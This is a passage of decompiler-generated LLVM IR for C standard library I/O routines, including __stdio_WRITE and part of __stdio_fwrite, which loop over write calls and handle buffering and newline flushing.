  %v4_1000c674 = icmp eq i32 %v0_1000c660, %v1_1000c674
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000c674, label %dec_label_pc_1000c680, label %dec_label_pc_1000c6b8

dec_label_pc_1000c680:                            ; preds = %dec_label_pc_1000c674
  %v2_1000c684 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c684, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000c6b8

dec_label_pc_1000c68c:                            ; preds = %entry
  %v2_1000c68411 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c68411, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1000c6b8

dec_label_pc_1000c698:                            ; preds = %dec_label_pc_1000c6f8.dec_label_pc_1000c6d8_crit_edge, %dec_label_pc_1000c6d8.preheader
  %v0_1000c698 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_1000c6a4 = inttoptr i32 %v0_1000c698 to i32*
  store i32 84, i32* %v2_1000c6a4, align 4
  %v0_1000c71c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c718

dec_label_pc_1000c6ac:                            ; preds = %dec_label_pc_1000c6e8
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000c708.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c704

dec_label_pc_1000c6b8:                            ; preds = %dec_label_pc_1000c680, %dec_label_pc_1000c674, %dec_label_pc_1000c68c
  %v2_1000c6e87 = phi i32 [ %v2_1000c684, %dec_label_pc_1000c680 ], [ %v0_1000c660, %dec_label_pc_1000c674 ], [ %v2_1000c68411, %dec_label_pc_1000c68c ]
  %v0_1000c6b8 = load i32, i32* @r5, align 4
  %v1_1000c6b8 = load i32, i32* @r6, align 4
  %v3_1000c6b8 = icmp ugt i32 %v0_1000c6b8, %v1_1000c6b8
  br i1 %v3_1000c6b8, label %dec_label_pc_1000c6c0, label %dec_label_pc_1000c6c4

dec_label_pc_1000c6c0:                            ; preds = %dec_label_pc_1000c6b8
  store i32 %v1_1000c6b8, i32* @r5, align 4
  br label %dec_label_pc_1000c6c4

dec_label_pc_1000c6c4:                            ; preds = %dec_label_pc_1000c6b8, %dec_label_pc_1000c6c0
  %v0_1000c6d0 = phi i32 [ %v0_1000c6b8, %dec_label_pc_1000c6b8 ], [ %v1_1000c6b8, %dec_label_pc_1000c6c0 ]
  %v1_1000c6c4 = add i32 %v0_1000c6d0, 1
  store i32 %v1_1000c6c4, i32* %r0.global-to-local, align 4
  %v0_1000c6c8 = load i32, i32* @r4, align 4
  %v1_1000c6c8 = inttoptr i32 %v0_1000c6c8 to i32*
  %v2_1000c6c8 = load i32, i32* %v1_1000c6c8, align 4
  store i32 %v2_1000c6c8, i32* %r11.global-to-local, align 4
  store i32 %v0_1000c6d0, i32* %r9.global-to-local, align 4
  store i32 %v0_1000c6d0, i32* %ctr.global-to-local, align 4
  %v2_1000c7003 = icmp eq i32 %v0_1000c6d0, 0
  br i1 %v2_1000c7003, label %dec_label_pc_1000c704, label %dec_label_pc_1000c6d8.preheader

dec_label_pc_1000c6d8.preheader:                  ; preds = %dec_label_pc_1000c6c4
  %v1_1000c6d816 = inttoptr i32 %v2_1000c6c8 to i32*
  %v2_1000c6d817 = load i32, i32* %v1_1000c6d816, align 4
  store i32 %v2_1000c6d817, i32* %r0.global-to-local, align 4
  %v1_1000c6dc18 = add i32 %v2_1000c6c8, 4
  store i32 %v1_1000c6dc18, i32* %r11.global-to-local, align 4
  %v2_1000c6e020 = icmp ugt i32 %v2_1000c6d817, 127
  br i1 %v2_1000c6e020, label %dec_label_pc_1000c698, label %dec_label_pc_1000c6e8.lr.ph

dec_label_pc_1000c6e8.lr.ph:                      ; preds = %dec_label_pc_1000c6d8.preheader
  %extract.t = trunc i32 %v2_1000c6d817 to i8
  br label %dec_label_pc_1000c6e8

dec_label_pc_1000c6e8:                            ; preds = %dec_label_pc_1000c6e8.lr.ph, %dec_label_pc_1000c6f8.dec_label_pc_1000c6d8_crit_edge
  %v2_1000c6d823.off0 = phi i8 [ %extract.t, %dec_label_pc_1000c6e8.lr.ph ], [ %extract.t24, %dec_label_pc_1000c6f8.dec_label_pc_1000c6d8_crit_edge ]
  %v2_1000c6e822 = phi i32 [ %v2_1000c6e87, %dec_label_pc_1000c6e8.lr.ph ], [ %v2_1000c6f8, %dec_label_pc_1000c6f8.dec_label_pc_1000c6d8_crit_edge ]
  %v3_1000c6e8 = inttoptr i32 %v2_1000c6e822 to i8*
  store i8 %v2_1000c6d823.off0, i8* %v3_1000c6e8, align 1
  %v0_1000c6ec = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c6ec = urem i32 %v0_1000c6ec, 256
  store i32 %v1_1000c6ec, i32* %r0.global-to-local, align 4
  %v3_1000c6f0 = icmp eq i32 %v1_1000c6ec, 0
  br i1 %v3_1000c6f0, label %dec_label_pc_1000c6ac, label %dec_label_pc_1000c6f8

dec_label_pc_1000c6f8:                            ; preds = %dec_label_pc_1000c6e8
  %v0_1000c6f8 = load i32, i32* @r3, align 4
  %v1_1000c6f8 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000c6f8 = add i32 %v1_1000c6f8, %v0_1000c6f8
  store i32 %v2_1000c6f8, i32* @r3, align 4
  %v0_1000c6fc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c6fc = add i32 %v0_1000c6fc, -1
  store i32 %v1_1000c6fc, i32* %r9.global-to-local, align 4
  %v0_1000c700 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c700 = add i32 %v0_1000c700, -1
  store i32 %v1_1000c700, i32* %ctr.global-to-local, align 4
  %v2_1000c700 = icmp eq i32 %v1_1000c700, 0
  br i1 %v2_1000c700, label %dec_label_pc_1000c704, label %dec_label_pc_1000c6f8.dec_label_pc_1000c6d8_crit_edge

dec_label_pc_1000c6f8.dec_label_pc_1000c6d8_crit_edge: ; preds = %dec_label_pc_1000c6f8
  %v0_1000c6d8.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c6d8 = inttoptr i32 %v0_1000c6d8.pre to i32*
  %v2_1000c6d8 = load i32, i32* %v1_1000c6d8, align 4
  store i32 %v2_1000c6d8, i32* %r0.global-to-local, align 4
  %v1_1000c6dc = add i32 %v0_1000c6d8.pre, 4
  store i32 %v1_1000c6dc, i32* %r11.global-to-local, align 4
  %v2_1000c6e0 = icmp ugt i32 %v2_1000c6d8, 127
  %extract.t24 = trunc i32 %v2_1000c6d8 to i8
  br i1 %v2_1000c6e0, label %dec_label_pc_1000c698, label %dec_label_pc_1000c6e8

dec_label_pc_1000c704:                            ; preds = %dec_label_pc_1000c6f8, %dec_label_pc_1000c6c4, %dec_label_pc_1000c6ac
  %v0_1000c708 = phi i32 [ %v0_1000c708.pre, %dec_label_pc_1000c6ac ], [ %v2_1000c6e87, %dec_label_pc_1000c6c4 ], [ %v2_1000c6f8, %dec_label_pc_1000c6f8 ]
  %v2_1000c704 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c704, i32* %r0.global-to-local, align 4
  %v4_1000c708 = icmp eq i32 %v0_1000c708, %v2_1000c704
  br i1 %v4_1000c708, label %dec_label_pc_1000c714, label %dec_label_pc_1000c710

dec_label_pc_1000c710:                            ; preds = %dec_label_pc_1000c704
  %v0_1000c710 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c710 = load i32, i32* @r4, align 4
  %v2_1000c710 = inttoptr i32 %v1_1000c710 to i32*
  store i32 %v0_1000c710, i32* %v2_1000c710, align 4
  br label %dec_label_pc_1000c714

dec_label_pc_1000c714:                            ; preds = %dec_label_pc_1000c704, %dec_label_pc_1000c710
  %v0_1000c714 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c714 = load i32, i32* @r5, align 4
  %v2_1000c714 = sub i32 %v1_1000c714, %v0_1000c714
  store i32 %v2_1000c714, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c718

dec_label_pc_1000c718:                            ; preds = %dec_label_pc_1000c698, %dec_label_pc_1000c714
  %v0_1000c71c = phi i32 [ %v0_1000c71c.pre, %dec_label_pc_1000c698 ], [ %v2_1000c714, %dec_label_pc_1000c714 ]
  store i32 %v0_1000c664, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c71c

; uselistorder directives
  uselistorder i32 %v1_1000c700, { 1, 0 }
  uselistorder i32 %v2_1000c6f8, { 0, 2, 1 }
  uselistorder i32 %v1_1000c6ec, { 1, 0 }
  uselistorder i32 %v0_1000c6d0, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1000c6e87, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c718, { 1, 0 }
  uselistorder label %dec_label_pc_1000c714, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6b8, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000c72c = load i32, i32* @lr, align 4
  store i32 %v0_1000c72c, i32* %r0.global-to-local, align 4
  %v0_1000c738 = load i32, i32* @r5, align 4
  store i32 %v0_1000c738, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_1000c738, i32* @r31, align 4
  %v3_1000c74c3 = icmp eq i32 %v0_1000c738, 0
  store i32 %v0_1000c738, i32* @r27, align 4
  br i1 %v3_1000c74c3, label %dec_label_pc_1000c7f4, label %dec_label_pc_1000c75c

dec_label_pc_1000c75c:                            ; preds = %entry, %dec_label_pc_1000c77c
  %v0_1000c76c = phi i32 [ %v2_1000c77c, %dec_label_pc_1000c77c ], [ %arg2, %entry ]
  %v1_1000c75c.in = phi i32 [ %v2_1000c780, %dec_label_pc_1000c77c ], [ %v0_1000c738, %entry ]
  %v1_1000c75c = icmp sgt i32 %v1_1000c75c.in, 0
  br i1 %v1_1000c75c, label %dec_label_pc_1000c768, label %dec_label_pc_1000c760

dec_label_pc_1000c760:                            ; preds = %dec_label_pc_1000c75c
  br label %dec_label_pc_1000c768

dec_label_pc_1000c768:                            ; preds = %dec_label_pc_1000c75c, %dec_label_pc_1000c760
  %v0_1000c768 = load i32, i32* @r30, align 4
  %v1_1000c768 = add i32 %v0_1000c768, 4
  %v2_1000c768 = inttoptr i32 %v1_1000c768 to i32*
  %v3_1000c768 = load i32, i32* %v2_1000c768, align 4
  store i32 268486516, i32* @lr, align 4
  %v3_1000c770 = call i32 @__libc_write(i32 %v3_1000c768, i32 %v0_1000c76c)
  %v1_1000c774 = icmp slt i32 %v3_1000c770, 0
  br i1 %v1_1000c774, label %dec_label_pc_1000c788, label %dec_label_pc_1000c77c

dec_label_pc_1000c77c:                            ; preds = %dec_label_pc_1000c768
  %v0_1000c77c = load i32, i32* @r29, align 4
  %v2_1000c77c = add i32 %v0_1000c77c, %v3_1000c770
  store i32 %v2_1000c77c, i32* @r29, align 4
  %v1_1000c780 = load i32, i32* @r31, align 4
  %v2_1000c780 = sub i32 %v1_1000c780, %v3_1000c770
  store i32 %v2_1000c780, i32* @r31, align 4
  %v3_1000c74c = icmp eq i32 %v2_1000c780, 0
  store i32 %v2_1000c780, i32* @r27, align 4
  br i1 %v3_1000c74c, label %dec_label_pc_1000c74c.dec_label_pc_1000c7f4.loopexit_crit_edge, label %dec_label_pc_1000c75c

dec_label_pc_1000c788:                            ; preds = %dec_label_pc_1000c768
  %v0_1000c788 = load i32, i32* @r30, align 4
  %v1_1000c788 = add i32 %v0_1000c788, 8
  %v2_1000c788 = inttoptr i32 %v1_1000c788 to i32*
  %v3_1000c788 = load i32, i32* %v2_1000c788, align 4
  store i32 %v3_1000c788, i32* %r11.global-to-local, align 4
  %v1_1000c78c = add i32 %v0_1000c788, 12
  %v2_1000c78c = inttoptr i32 %v1_1000c78c to i32*
  %v3_1000c78c = load i32, i32* %v2_1000c78c, align 4
  store i32 %v3_1000c78c, i32* %r0.global-to-local, align 4
  %v1_1000c790 = inttoptr i32 %v0_1000c788 to i16*
  %v2_1000c790 = load i16, i16* %v1_1000c790, align 2
  %v2_1000c794 = sub i32 %v3_1000c78c, %v3_1000c788
  store i32 %v2_1000c794, i32* %r0.global-to-local, align 4
  %v5_1000c794 = icmp eq i32 %v2_1000c794, 0
  %v1_1000c798 = or i16 %v2_1000c790, 8
  store i16 %v1_1000c798, i16* %v1_1000c790, align 2
  br i1 %v5_1000c794, label %dec_label_pc_1000c788.dec_label_pc_1000c7f0_crit_edge, label %dec_label_pc_1000c7a4

dec_label_pc_1000c788.dec_label_pc_1000c7f0_crit_edge: ; preds = %dec_label_pc_1000c788
  %v0_1000c7f0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c7f0

dec_label_pc_1000c7a4:                            ; preds = %dec_label_pc_1000c788
  %v0_1000c7a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7a4 = load i32, i32* @r31, align 4
  %v3_1000c7a4 = icmp ugt i32 %v0_1000c7a4, %v1_1000c7a4
  br i1 %v3_1000c7a4, label %dec_label_pc_1000c7a4.dec_label_pc_1000c7b0_crit_edge, label %dec_label_pc_1000c7ac

dec_label_pc_1000c7a4.dec_label_pc_1000c7b0_crit_edge: ; preds = %dec_label_pc_1000c7a4
  %v0_1000c7b0.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000c7b0

dec_label_pc_1000c7ac:                            ; preds = %dec_label_pc_1000c7a4
  store i32 %v0_1000c7a4, i32* @r27, align 4
  br label %dec_label_pc_1000c7b0

dec_label_pc_1000c7b0:                            ; preds = %dec_label_pc_1000c7a4.dec_label_pc_1000c7b0_crit_edge, %dec_label_pc_1000c7ac
  %v0_1000c7b0 = phi i32 [ %v0_1000c7b0.pre, %dec_label_pc_1000c7a4.dec_label_pc_1000c7b0_crit_edge ], [ %v0_1000c7a4, %dec_label_pc_1000c7ac ]
  store i32 %v0_1000c7b0, i32* %ctr.global-to-local, align 4
  %v2_1000c7bc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c7b4

dec_label_pc_1000c7b4:                            ; preds = %dec_label_pc_1000c7d8, %dec_label_pc_1000c7b0
  %v2_1000c7bc = phi i32 [ %v1_1000c7d8, %dec_label_pc_1000c7d8 ], [ %v2_1000c7bc.pre, %dec_label_pc_1000c7b0 ]
  %v0_1000c7b4 = load i32, i32* @r29, align 4
  %v1_1000c7b4 = inttoptr i32 %v0_1000c7b4 to i8*
  %v2_1000c7b4 = load i8, i8* %v1_1000c7b4, align 1
  %v3_1000c7b4 = zext i8 %v2_1000c7b4 to i32
  store i32 %v3_1000c7b4, i32* %r0.global-to-local, align 4
  %v1_1000c7b8 = add i32 %v0_1000c7b4, 1
  store i32 %v1_1000c7b8, i32* @r29, align 4
  %v3_1000c7bc = inttoptr i32 %v2_1000c7bc to i8*
  store i8 %v2_1000c7b4, i8* %v3_1000c7bc, align 1
  %v0_1000c7c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7c0 = urem i32 %v0_1000c7c0, 256
  store i32 %v1_1000c7c0, i32* %r0.global-to-local, align 4
  %v3_1000c7c4 = icmp eq i32 %v1_1000c7c0, 10
  br i1 %v3_1000c7c4, label %dec_label_pc_1000c7cc, label %dec_label_pc_1000c7d8

dec_label_pc_1000c7cc:                            ; preds = %dec_label_pc_1000c7b4
  %v0_1000c7cc = load i32, i32* @r30, align 4
  %v1_1000c7cc = inttoptr i32 %v0_1000c7cc to i16*
  %v2_1000c7cc = load i16, i16* %v1_1000c7cc, align 2
  %v3_1000c7cc = zext i16 %v2_1000c7cc to i32
  store i32 %v3_1000c7cc, i32* %r0.global-to-local, align 4
  %v1_1000c7d0 = and i32 %v3_1000c7cc, 256
  %v3_1000c7d0 = icmp eq i32 %v1_1000c7d0, 0
  br i1 %v3_1000c7d0, label %dec_label_pc_1000c7d8, label %dec_label_pc_1000c7cc.dec_label_pc_1000c7e0_crit_edge

dec_label_pc_1000c7cc.dec_label_pc_1000c7e0_crit_edge: ; preds = %dec_label_pc_1000c7cc
  %v0_1000c7e4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c7e0

dec_label_pc_1000c7d8:                            ; preds = %dec_label_pc_1000c7cc, %dec_label_pc_1000c7b4
  %v0_1000c7d8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c7d8 = add i32 %v0_1000c7d8, 1
  store i32 %v1_1000c7d8, i32* %r11.global-to-local, align 4
  %v0_1000c7dc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c7dc = add i32 %v0_1000c7dc, -1
  store i32 %v1_1000c7dc, i32* %ctr.global-to-local, align 4
  %v2_1000c7dc = icmp eq i32 %v1_1000c7dc, 0
  br i1 %v2_1000c7dc, label %dec_label_pc_1000c7d8.dec_label_pc_1000c7e0_crit_edge, label %dec_label_pc_1000c7b4

dec_label_pc_1000c7d8.dec_label_pc_1000c7e0_crit_edge: ; preds = %dec_label_pc_1000c7d8
  %v0_1000c7e0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c7e0

dec_label_pc_1000c7e0:                            ; preds = %dec_label_pc_1000c7cc.dec_label_pc_1000c7e0_crit_edge, %dec_label_pc_1000c7d8.dec_label_pc_1000c7e0_crit_edge
  %v0_1000c7e4 = phi i32 [ %v1_1000c7d8, %dec_label_pc_1000c7d8.dec_label_pc_1000c7e0_crit_edge ], [ %v0_1000c7e4.pre, %dec_label_pc_1000c7cc.dec_label_pc_1000c7e0_crit_edge ]
  %v0_1000c7e0 = phi i32 [ %v0_1000c7e0.pre, %dec_label_pc_1000c7d8.dec_label_pc_1000c7e0_crit_edge ], [ %v0_1000c7cc, %dec_label_pc_1000c7cc.dec_label_pc_1000c7e0_crit_edge ]
  %v1_1000c7e0 = add i32 %v0_1000c7e0, 8
  %v2_1000c7e0 = inttoptr i32 %v1_1000c7e0 to i32*
  %v3_1000c7e0 = load i32, i32* %v2_1000c7e0, align 4
  store i32 %v3_1000c7e0, i32* %r0.global-to-local, align 4
  %v2_1000c7e4 = add i32 %v0_1000c7e0, 16
  %v3_1000c7e4 = inttoptr i32 %v2_1000c7e4 to i32*
  store i32 %v0_1000c7e4, i32* %v3_1000c7e4, align 4
  %v0_1000c7e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7e8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000c7e8 = sub i32 %v1_1000c7e8, %v0_1000c7e8
  store i32 %v2_1000c7e8, i32* %r0.global-to-local, align 4
  %v1_1000c7ec = load i32, i32* @r31, align 4
  %v2_1000c7ec = sub i32 %v1_1000c7ec, %v2_1000c7e8
  store i32 %v2_1000c7ec, i32* @r31, align 4
  br label %dec_label_pc_1000c7f0

dec_label_pc_1000c7f0:                            ; preds = %dec_label_pc_1000c788.dec_label_pc_1000c7f0_crit_edge, %dec_label_pc_1000c7e0
  %v0_1000c7f0 = phi i32 [ %v0_1000c7f0.pre, %dec_label_pc_1000c788.dec_label_pc_1000c7f0_crit_edge ], [ %v2_1000c7ec, %dec_label_pc_1000c7e0 ]
  %v1_1000c7f0 = load i32, i32* @r28, align 4
  %v2_1000c7f0 = sub i32 %v1_1000c7f0, %v0_1000c7f0
  store i32 %v2_1000c7f0, i32* @r28, align 4
  br label %dec_label_pc_1000c7f4

dec_label_pc_1000c74c.dec_label_pc_1000c7f4.loopexit_crit_edge: ; preds = %dec_label_pc_1000c77c
  %v0_1000c7f8.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c7f4

dec_label_pc_1000c7f4:                            ; preds = %entry, %dec_label_pc_1000c74c.dec_label_pc_1000c7f4.loopexit_crit_edge, %dec_label_pc_1000c7f0
  %v0_1000c7f8 = phi i32 [ %v2_1000c7f0, %dec_label_pc_1000c7f0 ], [ %v0_1000c7f8.pre.pre, %dec_label_pc_1000c74c.dec_label_pc_1000c7f4.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1000c72c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c7f8

; uselistorder directives
  uselistorder i32 %v0_1000c7e0, { 1, 0 }
  uselistorder i32 %v1_1000c7dc, { 1, 0 }
  uselistorder i32 %v1_1000c7d8, { 0, 2, 1 }
  uselistorder i32 %v1_1000c7c0, { 1, 0 }
  uselistorder i32 %v2_1000c780, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000c77c, { 1, 0 }
  uselistorder i32 %v3_1000c770, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c7f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c7f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c768, { 1, 0 }
  uselistorder label %dec_label_pc_1000c75c, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_1000c80c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_1000c828 = load i16, i16* %arg3, align 2
  %v1_1000c82c = and i16 %v3_1000c828, 512
  %v3_1000c82c = icmp eq i16 %v1_1000c82c, 0
  br i1 %v3_1000c82c, label %dec_label_pc_1000c834, label %dec_label_pc_1000c940

dec_label_pc_1000c834:                            ; preds = %entry
  %v2_1000c834 = add i32 %tmp, 4
  %v3_1000c834 = inttoptr i32 %v2_1000c834 to i32*
  %v4_1000c834 = load i32, i32* %v3_1000c834, align 4
  %v2_1000c838 = add i32 %tmp, 16
  %v3_1000c838 = inttoptr i32 %v2_1000c838 to i32*
  %v4_1000c838 = load i32, i32* %v3_1000c838, align 4
  store i32 %v4_1000c838, i32* @r3, align 4
  %v3_1000c83c = icmp eq i32 %v4_1000c834, -2
  %v2_1000c840 = add i32 %tmp, 12
  %v3_1000c840 = inttoptr i32 %v2_1000c840 to i32*
  %v4_1000c840 = load i32, i32* %v3_1000c840, align 4
  %v2_1000c848 = sub i32 %v4_1000c840, %v4_1000c838
  br i1 %v3_1000c83c, label %dec_label_pc_1000c848, label %dec_label_pc_1000c878

dec_label_pc_1000c848:                            ; preds = %dec_label_pc_1000c834
  %v3_1000c850 = icmp ult i32 %v2_1000c848, %arg2
  br i1 %v3_1000c850, label %dec_label_pc_1000c858, label %dec_label_pc_1000c85c

dec_label_pc_1000c858:                            ; preds = %dec_label_pc_1000c848
  br label %dec_label_pc_1000c85c

dec_label_pc_1000c85c:                            ; preds = %dec_label_pc_1000c848, %dec_label_pc_1000c858
  %storemerge = phi i32 [ %v2_1000c848, %dec_label_pc_1000c858 ], [ %arg2, %dec_label_pc_1000c848 ]
  %v0_1000c860 = phi i32 [ %v2_1000c848, %dec_label_pc_1000c858 ], [ %arg2, %dec_label_pc_1000c848 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_1000c860, i32* @r5, align 4
  store i32 268486760, i32* @lr, align 4
  %v0_1000c864 = call i32 @memcpy()
  %v0_1000c868 = load i32, i32* @r30, align 4
  %v1_1000c868 = add i32 %v0_1000c868, 16
  %v2_1000c868 = inttoptr i32 %v1_1000c868 to i32*
  %v3_1000c868 = load i32, i32* %v2_1000c868, align 4
  %v1_1000c86c = load i32, i32* @r31, align 4
  %v2_1000c86c = add i32 %v1_1000c86c, %v3_1000c868
  store i32 %v2_1000c86c, i32* %v2_1000c868, align 4
  br label %dec_label_pc_1000c960

dec_label_pc_1000c878:                            ; preds = %dec_label_pc_1000c834
  %v3_1000c87c = icmp ult i32 %v2_1000c848, %arg2
  br i1 %v3_1000c87c, label %dec_label_pc_1000c91c, label %dec_label_pc_1000c884

dec_label_pc_1000c884:                            ; preds = %dec_label_pc_1000c878
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268486800, i32* @lr, align 4
  %v0_1000c88c = call i32 @memcpy()
  %v0_1000c890 = load i32, i32* @r30, align 4
  %v1_1000c890 = inttoptr i32 %v0_1000c890 to i16*
  %v2_1000c890 = load i16, i16* %v1_1000c890, align 2
  %v1_1000c894 = add i32 %v0_1000c890, 16
  %v2_1000c894 = inttoptr i32 %v1_1000c894 to i32*
  %v3_1000c894 = load i32, i32* %v2_1000c894, align 4
  %v1_1000c898 = and i16 %v2_1000c890, 256
  %v3_1000c898 = icmp eq i16 %v1_1000c898, 0
  %v1_1000c89c = load i32, i32* @r29, align 4
  %v2_1000c89c = add i32 %v1_1000c89c, %v3_1000c894
  store i32 %v2_1000c89c, i32* %v2_1000c894, align 4
  br i1 %v3_1000c898, label %dec_label_pc_1000c960, label %dec_label_pc_1000c8a8

dec_label_pc_1000c8a8:                            ; preds = %dec_label_pc_1000c884
  %v0_1000c8a8 = load i32, i32* @r28, align 4
  %v0_1000c8b0 = load i32, i32* @r29, align 4
  store i32 268486840, i32* @lr, align 4
  %v4_1000c8b4 = call i32 @memrchr(i32 %v0_1000c8a8, i32 10, i32 %v0_1000c8b0, i32 %v2_1000c89c)
  %v3_1000c8b8 = icmp eq i32 %v4_1000c8b4, 0
  br i1 %v3_1000c8b8, label %dec_label_pc_1000c960, label %dec_label_pc_1000c8c0

dec_label_pc_1000c8c0:                            ; preds = %dec_label_pc_1000c8a8
  %v0_1000c8c0 = load i32, i32* @r30, align 4
  store i32 %v0_1000c8c0, i32* @r3, align 4
  store i32 268486856, i32* @lr, align 4
  %v0_1000c8c4 = call i32 @__stdio_wcommit()
  %v3_1000c8c8 = icmp eq i32 %v0_1000c8c4, 0
  br i1 %v3_1000c8c8, label %dec_label_pc_1000c960, label %dec_label_pc_1000c8d0

dec_label_pc_1000c8d0:                            ; preds = %dec_label_pc_1000c8c0
  %v0_1000c8d0 = load i32, i32* @r29, align 4
  %v3_1000c8d0 = icmp ugt i32 %v0_1000c8d0, %v0_1000c8c4
  %v0_1000c8c4.v0_1000c8d4 = select i1 %v3_1000c8d0, i32 %v0_1000c8c4, i32 %v0_1000c8d0
  store i32 %v0_1000c8c4.v0_1000c8d4, i32* @r31, align 4
  %v2_1000c8e0 = sub i32 %v0_1000c8d0, %v0_1000c8c4.v0_1000c8d4
  %v0_1000c8e8 = load i32, i32* @r28, align 4
  %v2_1000c8e8 = add i32 %v0_1000c8e8, %v2_1000c8e0
  store i32 %v2_1000c8e8, i32* @r28, align 4
  store i32 %v2_1000c8e8, i32* @r3, align 4
  store i32 268486904, i32* @lr, align 4
  %v3_1000c8f4 = call i32 @__GI_memchr(i32 %v2_1000c8e8, i32 10, i32 %v0_1000c8c4.v0_1000c8d4)
  %v3_1000c8f8 = icmp eq i32 %v3_1000c8f4, 0
  br i1 %v3_1000c8f8, label %dec_label_pc_1000c960, label %dec_label_pc_1000c900

dec_label_pc_1000c900:                            ; preds = %dec_label_pc_1000c8d0
  %v0_1000c900 = load i32, i32* @r30, align 4
  %v1_1000c900 = add i32 %v0_1000c900, 16
  %v2_1000c900 = inttoptr i32 %v1_1000c900 to i32*
  %v3_1000c900 = load i32, i32* %v2_1000c900, align 4
  %v0_1000c904 = load i32, i32* @r28, align 4
  %v1_1000c904 = load i32, i32* @r31, align 4
  %v2_1000c904 = sub i32 %v0_1000c904, %v3_1000c8f4
  %v2_1000c908 = add i32 %v2_1000c904, %v1_1000c904
  %v2_1000c90c = sub i32 %v3_1000c900, %v2_1000c908
  %v1_1000c910 = load i32, i32* @r29, align 4
  %v2_1000c910 = sub i32 %v1_1000c910, %v2_1000c908
  store i32 %v2_1000c910, i32* @r29, align 4
  store i32 %v2_1000c90c, i32* %v2_1000c900, align 4
  br label %dec_label_pc_1000c960

dec_label_pc_1000c91c:                            ; preds = %dec_label_pc_1000c878
  %v2_1000c91c = add i32 %tmp, 8
  %v3_1000c91c = inttoptr i32 %v2_1000c91c to i32*
  %v4_1000c91c = load i32, i32* %v3_1000c91c, align 4
  %v4_1000c920 = icmp eq i32 %v4_1000c838, %v4_1000c91c
  br i1 %v4_1000c920, label %dec_label_pc_1000c940, label %dec_label_pc_1000c928

dec_label_pc_1000c928:                            ; preds = %dec_label_pc_1000c91c
  store i32 %tmp, i32* @r3, align 4
  store i32 268486960, i32* @lr, align 4
  %v0_1000c92c = call i32 @__stdio_wcommit()
  %v3_1000c930 = icmp eq i32 %v0_1000c92c, 0
  br i1 %v3_1000c930, label %dec_label_pc_1000c928.dec_label_pc_1000c940_crit_edge, label %dec_label_pc_1000c938

dec_label_pc_1000c928.dec_label_pc_1000c940_crit_edge: ; preds = %dec_label_pc_1000c928
  %v0_1000c944.pre = load i32, i32* @r30, align 4
